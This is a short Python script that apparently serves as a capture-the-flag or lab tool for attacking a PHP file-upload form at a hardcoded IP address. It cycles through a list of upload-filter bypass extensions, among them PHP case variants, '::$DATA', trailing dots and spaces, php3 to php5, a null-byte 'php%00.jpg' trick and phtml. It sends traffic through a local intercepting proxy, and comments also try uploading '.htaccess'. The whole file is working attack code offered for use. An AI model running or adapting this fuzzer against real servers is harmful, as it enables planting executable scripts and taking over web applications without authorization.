from distutils.command.upload import upload
from pathlib import Path

import requests

url = 'http://1.14.71.254:28145/upload.php'
key = 'uploaded'
# files={'foo':('aaa', 'bar')}  # form-data; name="foo"; filename="aaa", body: bar
success_txt = 'fully'

# blacklist_txt = '不允许上传'
data = {'submit': ''}
proxies = {'http': 'http://127.0.0.1:8080'}
# proxies = {}

def basic_check():
    file = open('basic.jpg', 'rb')  # create an empty demo file
    files = {key: file}
    data = {'submit': ''}

    print(requests.Request('POST', 'http://example.com', files=files, data=data).prepare().body.decode('ascii'))
    # --c226ce13d09842658ffbd31e0563c6bd
    # Content-Disposition: form-data; name="upload_file"; filename="file.txt"


def upload_file(filename, upload_filename=None):
    if upload_filename is None:
        upload_filename = filename
    file = open(filename, 'rb').read()  # create an empty demo file
    files = {key: (upload_filename, file, 'image/jpeg')}
    send_request(data, filename, files, proxies, upload_filename)


def upload_fuzz_ext():
    filename = 'basic.gif'
    file = open(filename, 'rb').read()  # create an empty demo file
    ext_lst = 'PHP,Php::$DATA,php,php.,php ,php. .,php3,php4,php5,php%00.jpg,phtml'.split(',')  # "basic.php .jpg"
    for ext in ext_lst:
        upload_filename = filename.split('.')[0] + '.' + ext
        files = {key: (upload_filename, file, 'image/jpeg')}
        send_request(data, filename, files, proxies, upload_filename)


def send_request(data, filename, files, proxies, upload_filename=None):
    if upload_filename is None:
        upload_filename = filename
    res = requests.post(url, files=files, data=data, proxies=proxies)
    if success_txt in res.text:
        print(f'uploaded: filename {filename}, uploaded: {upload_filename}')
    else:
        print(f'error: filename {filename}, uploaded: {upload_filename}')


if __name__ == '__main__':
    # upload_file('basic.PHp')
    # upload_file('.htaccess')
    # upload_file('basic.gif')
    upload_fuzz_ext()

    print()
